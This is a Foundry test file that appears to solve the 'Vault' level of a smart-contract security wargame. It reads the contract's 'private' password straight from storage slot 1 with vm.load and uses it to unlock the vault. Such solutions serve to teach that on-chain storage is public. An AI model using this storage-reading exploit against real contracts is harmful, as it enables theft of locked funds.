// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "../../src/8_Vault/Vault.sol";

contract VaultTest is Test {
    Vault public victim;
    bytes32 public password;

    function setUp() public {
        password = bytes32(
            uint256(keccak256(abi.encodePacked(block.timestamp)))
        );
        victim = new Vault(password);
    }

    function testUnlock() public {
        bytes32 passwordHack = vm.load(address(victim), bytes32(uint256(1)));

        assertEq(passwordHack, password);

        victim.unlock(passwordHack);

        assertEq(victim.locked(), false);
    }
}
